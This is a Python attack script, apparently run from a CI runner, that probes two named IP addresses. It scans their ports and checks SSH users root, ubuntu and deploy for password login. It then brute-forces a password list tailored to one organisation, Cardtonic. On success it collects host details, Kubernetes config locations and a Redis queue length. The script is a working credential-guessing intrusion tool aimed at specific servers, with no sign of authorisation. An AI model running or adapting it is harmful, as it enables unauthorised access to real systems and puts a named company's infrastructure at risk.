#!/usr/bin/env python3
# ct49 i226564 : SSH auth-surface probe for 64.227.117.180 (4th DO host) from GHA Azure egress.
# Control: 142.93.160.150:22 must show OPEN + "Permission denied (publickey)".
import subprocess, shlex

HOSTS = ["64.227.117.180", "142.93.160.150"]
USERS = ["root", "ubuntu", "deploy"]
PWS = ["Password1#", "Computer7,", "Tonic2024!", "Me@Cardtonic.com25", "M3@Admin",
       "Cardtonic@2025", "Cardtonic@2024", "1234567890", "Kpegetom1713",
       "Admin@123", "Ubuntu@2024", "P@ssw0rd"]


def run(cmd, t=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=t, text=True)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "EXC " + repr(e)


def say(x):
    print(x, flush=True)


say("EGRESS ipify=%s" % run("curl -s --max-time 12 https://api.ipify.org", 20).strip())
if not run("command -v sshpass").strip():
    say("sshpass-install: " + run("sudo apt-get update -qq >/dev/null 2>&1; sudo apt-get install -y -qq sshpass 2>&1 | tail -2", 240).strip())
if not run("command -v nc").strip():
    run("sudo apt-get install -y -qq netcat-openbsd >/dev/null 2>&1", 180)

for h in HOSTS:
    say("##### %s" % h)
    for p in (22, 80, 443, 3000, 6379, 8080):
        say("tcp/%d: %s" % (p, run("timeout 10 bash -c 'exec 3<>/dev/tcp/%s/%d' 2>&1 && echo OPEN" % (h, p), 15).strip() or "no-out"))
    say("banner22: " + run("timeout 12 bash -c 'exec 3<>/dev/tcp/%s/22; head -c 80 <&3' 2>&1 | head -c 120" % h, 20).strip())
    for u in USERS:
        out = run("timeout 24 ssh -o BatchMode=yes -o PreferredAuthentications=none -o ConnectTimeout=8 "
                  "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null %s@%s 2>&1 | grep -v 'Permanently added' | tail -2" % (u, h), 35)
        say("--- %s@%s :: %s" % (u, h, out.strip().replace("\n", " | ")))
        if "password" in out:
            for pw in PWS:
                r = run("timeout 30 sshpass -p %s ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password "
                        "-o NumberOfPasswordPrompts=1 -o ConnectTimeout=8 -o StrictHostKeyChecking=no "
                        "-o UserKnownHostsFile=/dev/null %s@%s 'id; hostname; uname -a; ip -4 addr | grep inet; "
                        "ss -lntp 2>/dev/null | head -40; head -3 /etc/os-release; free -m'" % (shlex.quote(pw), u, h), 45)
                ok = ("uid=" in r)
                say("    pw[%s] %s :: %s" % (pw, "HIT" if ok else "no", r.strip().replace("\n", " | ")[:600]))
                if ok:
                    say(run("sshpass -p %s ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
                            "%s@%s 'ls -l /etc/kubernetes/*.conf /var/lib/kubelet/kubeconfig 2>/dev/null; command -v kubectl; "
                            "redis-cli -h 127.0.0.1 -p 6379 LLEN JOBS__CARD_EXPIRY_TAG 2>&1; ss -lntp | head -40' 2>&1 | tail -30"
                            % (shlex.quote(pw), u, h), 45))
                    break
